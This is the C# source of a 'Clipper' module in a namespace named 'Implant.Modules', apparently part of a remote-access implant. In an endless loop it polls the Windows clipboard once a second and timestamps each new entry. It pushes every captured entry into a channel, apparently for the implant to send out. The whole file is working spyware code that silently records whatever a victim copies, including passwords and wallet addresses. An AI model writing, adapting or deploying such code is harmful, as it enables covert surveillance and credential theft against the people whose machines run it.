using System;
using System.Threading;
using System.Threading.Channels;
using System.Windows.Forms;

namespace Implant.Modules {

    public class Clipper {

        public static void run(Channel<string> channel) {
            string clipper = "";
            
            while (true) {
                string prev = clipper;
                clipper = GetClipboard();
                
                if(clipper != prev) {
                    string res = "[" + DateTime.Now.ToString("dd/MM/yy-HH:mm:ss") + "-Clipper] " + clipper;
                    Console.WriteLine(res);
                    channel.Writer.WriteAsync(res);
                }
                
                Thread.Sleep(1000);
            }
        }
        
        // Don't know why it has to be retrieved in a separate thread but that works
        private static string GetClipboard()
        {
            var returnValue = string.Empty;
            try {
                var staThread = new Thread(
                    delegate() { returnValue = Clipboard.GetText(); });
                staThread.SetApartmentState(ApartmentState.STA);
                staThread.Start();
                staThread.Join();
            }
            catch {
                // ignored
            }

            return returnValue;
        }
    }
}